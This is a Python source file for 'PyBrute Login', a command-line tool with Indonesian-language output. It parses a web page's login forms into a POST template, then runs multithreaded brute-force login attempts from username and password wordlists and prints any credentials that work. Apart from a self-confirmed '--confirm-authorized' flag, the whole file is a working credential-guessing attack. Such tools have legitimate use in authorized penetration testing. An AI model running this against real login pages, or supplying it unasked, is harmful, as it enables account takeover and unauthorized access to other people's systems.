import requests
from bs4 import BeautifulSoup
import argparse
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin, parse_qsl
import threading
import time
import sys

LOCK = threading.Lock()

def print_banner():
    banner = r"""
██████╗ ██╗   ██╗██████╗ ██╗   ██╗████████╗███████╗
██╔══██╗██║   ██║██╔══██╗██║   ██║╚══██╔══╝██╔════╝
██████╔╝██║   ██║██████╔╝██║   ██║   ██║   █████╗  
██╔═══╝ ██║   ██║██╔═══╝ ██║   ██║   ██║   ██╔══╝  
██║     ╚██████╔╝██║     ╚██████╔╝   ██║   ███████╗
╚═╝      ╚═════╝ ╚═╝      ╚═════╝    ╚═╝   ╚══════╝
         PyBrute Login - Brute Force & Analyzer
    """
    print(banner)


def analyze_post_params(url, timeout=10):
    try:
        resp = requests.get(url, timeout=timeout)
    except requests.RequestException as e:
        print(f"[-] Tidak dapat mengakses URL {url}. Error: {e}")
        return

    if resp.status_code != 200:
        print(f"[-] Tidak dapat mengakses URL {url}. Status code: {resp.status_code}")
        return

    soup = BeautifulSoup(resp.text, 'html.parser')
    forms = soup.find_all('form')

    if not forms:
        print("[!] Tidak ditemukan form di halaman ini.")
        return

    username_candidates = ['user', 'username', 'email', 'login', 'log', 'usr']
    password_candidates = ['pass', 'password', 'pwd']

    for i, form in enumerate(forms, start=1):
        print(f"\n[+] Form #{i}")
        method = form.get('method', 'GET').upper()
        action = form.get('action') or url
        action = urljoin(url, action)
        print(f"    Method: {method}")
        print(f"    Action: {action}")

        inputs = form.find_all('input')
        if not inputs:
            print("    Tidak ditemukan input field.")
            continue

        print("    Input Fields:")
        post_data = []
        for input_field in inputs:
            name = input_field.get('name') or '(tidak ada nama)'
            input_type = input_field.get('type', 'text')
            value = input_field.get('value', '')
            placeholder = input_field.get('placeholder', '')
            print(f"        - Name: {name}, Type: {input_type}, Value: {value}, Placeholder: {placeholder}")

            if name == '(tidak ada nama)':
                continue

            lname = name.lower()
            if any(c in lname for c in username_candidates):
                post_data.append(f"{name}=$user")
            elif any(c in lname for c in password_candidates):
                post_data.append(f"{name}=$pass")
            else:
                post_data.append(f"{name}={value}")

        if method == 'POST':
            post_string = "&".join(post_data)
            print(f"\n    [!] Format POST data untuk brute force:")
            print(f"    --post \"{post_string}\"")


def build_data_from_template(template, username, password):
    # template expected like: "field1=value1&userfield=$user&passfield=$pass"
    # parse into list of pairs then replace
    pairs = parse_qsl(template, keep_blank_values=True)
    data = {}
    for k, v in pairs:
        v2 = v.replace('$user', username).replace('$pass', password)
        data[k] = v2
    return data


def brute_force_attempt(session, url, username, password, post_template, success_response, attempt_number, total_attempts, timeout=10):
    try:
        data = build_data_from_template(post_template, username, password)
    except Exception as e:
        with LOCK:
            print(f"[!] Gagal membangun data POST untuk {username}:{password} - {e}")
        return False

    try:
        resp = session.post(url, data=data, timeout=timeout)
    except requests.RequestException as e:
        with LOCK:
            print(f"[-] Request error untuk {username} - {e}")
        return False

    progress = (attempt_number / total_attempts) * 100 if total_attempts else 0
    # Mask password in output
    masked = '***'
    with LOCK:
        print(f"Progres: {progress:.2f}% - Mencoba: {username}:{masked}")

    # Check success by response content or redirect
    try:
        if success_response and success_response in resp.text:
            with LOCK:
                print(f"[+] Login berhasil: {username}:{password}")
            return True
        # heuristic: redirect to different page may indicate login success
        if resp.history:
            with LOCK:
                print(f"[+] Redirect detected - kemungkinan login berhasil untuk {username}")
            return True
    except Exception:
        pass

    return False


def brute_force_threading(url, username_file, password_file, post_template, success_response, threads=5, timeout=10, delay=0.0):
    # Read username and password lists
    with open(username_file, 'r', encoding='utf-8') as f:
        users = [l.strip() for l in f if l.strip()]
    with open(password_file, 'r', encoding='utf-8') as f:
        passwords = [l.strip() for l in f if l.strip()]

    total_attempts = len(users) * len(passwords)
    if total_attempts == 0:
        print('[!] Tidak ada kombinasi username/password untuk dicoba.')
        return

    session = requests.Session()
    attempt_counter = 0
    success_found = False

    with ThreadPoolExecutor(max_workers=threads) as exc:
        futures = []
        for u in users:
            for p in passwords:
                attempt_counter += 1
                futures.append(exc.submit(brute_force_attempt, session, url, u, p, post_template, success_response, attempt_counter, total_attempts, timeout))
                if delay:
                    time.sleep(delay)

        # Wait for results
        for fut in futures:
            try:
                res = fut.result()
                if res:
                    success_found = True
                    # do not break to allow threads to finish cleanly
            except Exception as e:
                with LOCK:
                    print(f"[!] Exception in worker: {e}")

    if not success_found:
        print('[*] Tidak ditemukan kombinasi yang berhasil.')


def main():
    parser = argparse.ArgumentParser(description='PyBrute - Brute Force & Analyzer (for authorized testing only)')
    parser.add_argument('--url', help='Target URL (login page)', required=True)
    parser.add_argument('--analyze', action='store_true', help='Analyze forms on the page and show POST template')
    parser.add_argument('--post', help='POST template string, use $user and $pass for placeholders')
    parser.add_argument('--userlist', help='File with usernames (one per line)')
    parser.add_argument('--passlist', help='File with passwords (one per line)')
    parser.add_argument('--success', help='String that indicates successful login (optional)')
    parser.add_argument('--threads', type=int, default=5, help='Number of concurrent threads')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds')
    parser.add_argument('--delay', type=float, default=0.0, help='Delay between task submissions (seconds)')
    parser.add_argument('--confirm-authorized', action='store_true', help='You must confirm you have authorization to test this target')

    args = parser.parse_args()

    print_banner()

    if args.analyze:
        analyze_post_params(args.url, timeout=args.timeout)
        sys.exit(0)

    # Brute-force path
    if not args.confirm_authorized:
        print('[!] Anda harus menjalankan dengan flag --confirm-authorized untuk memastikan Anda memiliki izin.')
        sys.exit(1)

    if not args.post or not args.userlist or not args.passlist:
        print('[!] Untuk mode brute-force, --post, --userlist, dan --passlist wajib.')
        sys.exit(1)

    # Resolve action URL if post template provides a different action (expectation: user supplies correct URL)
    target_url = args.url

    brute_force_threading(target_url, args.userlist, args.passlist, args.post, args.success or '', threads=args.threads, timeout=args.timeout, delay=args.delay)


if __name__ == '__main__':
    main()
